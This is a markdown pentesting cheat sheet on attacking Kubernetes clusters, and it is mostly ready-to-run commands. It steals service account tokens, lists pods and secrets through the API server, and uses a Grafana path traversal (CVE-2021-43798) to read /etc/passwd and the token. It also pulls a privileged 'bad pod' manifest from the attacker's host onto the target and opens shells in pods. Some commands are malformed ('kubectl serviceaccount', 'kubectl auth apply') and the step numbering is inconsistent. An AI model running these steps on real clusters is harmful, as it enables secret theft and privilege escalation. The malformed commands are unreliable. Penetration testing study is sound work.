---
title: Kubernetes Pentesting
desc: A portable, extensible, open source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It uses port 8443.
tags: [6443, 8443, Container, Kubectl, Kubernetes]
alts: [JWT-Pentesting]
render_with_liquid: false
---

## Fetch Information from Kubernetes API Server

1. **Find Token**

    ```sh
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    ```

2. **Decode JWT Token**

    If you get the token, decode it using some tool.  

    **[JWT.io](https://jwt.io/){:target="_blank"}** is an useful online tool.  

3. **Fetch Information**

    ```sh
    # -k: insecure (HTTPS)
    curl -k -v -H "Authorization: Bearer <jwt-token>" https://<target-ip>:<target-port>/api/v1/namespaces/default/pods/
    curl -k -v -H "Authorization: Bearer <jwt-token>" https://<target-ip>:<target-port>/api/v1/namespaces/default/secrets/
    ```

<br />

## Interact with Kubernetes API Server

1. **Create a Service Account**

    ```sh
    # Create a ServiceAccount
    kubectl serviceaccount api-explorer
    # Bind the ClusterRole to the ServiceAccount
    # eg. namespace: default
    kubectl create rolebinding api-explorer:log-reader --clusterrole log-reader --serviceaccount default:api-explorer 
    ```

2. **Check Your Permission**

    ```sh
    kubectl auth can-i --list
    # /var/run/secrets/kubernetes.io/serviceaccount/token
    kubectl auth can-i --list --token=<JWT>
    ```

3. **List All Pods**

    ```sh
    kubectl get pods
    ```

4. **List All Secrets**

    ```sh
    kubectl get secrets

    # Get the specific secret
    kubectl get secret <secret-name>
    # Get the specific secret to output json
    kubectl get secret <secret-name> -o 'json'

    # List all data contained in the specific secret
    kubectl describe secret <secret-name>
    ```

5. **Get the Token (JWT) of the Service Account Running a Pod**

    ```sh
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    ```

<br />

## Grafana Exploiting

Some Grafana versions are vulnerable to Path Traversal.  

Kubernetes creates environment variables by default.

1. **Check Environment Variables on the Target Machine**

    ```sh
    env
    ```

    If you got the GRAFANA environment like the following, the Grafana service is running on the cluster.  

    ```
    GRAFANA_SERVICE_HOST=10.108.133.228
    GRAFANA_PORT=tcp://10.108.133.228:3000
    GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
    ```

2. **Access the Grafana Dashboard**

    You can access the service at **http://<grafana-ip>:<grafana-port>**.  

2. **Get the JWT of the Service Account**

    Using Path Traversal (CVE-2021-43798).

    ```sh
    curl --path-as-is http://<grafana-ip>:<grafana-port>/public/plugins/alertlist/../../../../../../../../etc/passwd
    ```

    Get the token (JWT) of the service account.

    ```sh
    curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
    ```

3. **Decode the JWT and Get Sensitive Information**

    See **[JWT Pentesting](./JWT-Pentesting){:target="_blank"}**.
    

4. **Check Your Permission of This Service**

    Using the JWT, you should get permissions.

    ```sh
    kubectl auth can-i --list --token=<Grafana-JWT>

    # List pods
    kubectl get pods --token=<JWT>
    ```

5. **Get a Shell on the Grafana Pod**

    ```sh
    kubectl exec -it <grafana-pod-name> --token=<Grafana-JWT> -- /bin/bash
    ```

## Privilege Escalation using Bad Pods

    Reference: [everything-allowed-exec-pod.yaml](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml){:target="_blank"}

1. **Download the Bad Pod**

    At first, you need to download the bad pod on your local machine.

    ```sh
    wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml -O privesc.yaml
    ```

    Then start web server to allow the target machine to get this bad pod.

    ```sh
    python3 -m http.server 8000
    ```

3. **Trasfer the Bad Pod to the Target Machine**

    On the target machine, download the bad pod from your local machine.

    ```sh
    wget http://<your-local-ip>:8000/privesc.yaml
    ```

4. **Create the Pod**

    ```sh
    # Create the pod
    kubectl auth apply -f privesc.yaml --token=<JWT>
    
    # List all pods
    kubectl get pods --token=<JWT>
    ```

5. **Get a Shell**

    ```sh
    kubectl exec -it everything-allowed-exec-pod --token=<JWT> -- /bin/bash
    ```
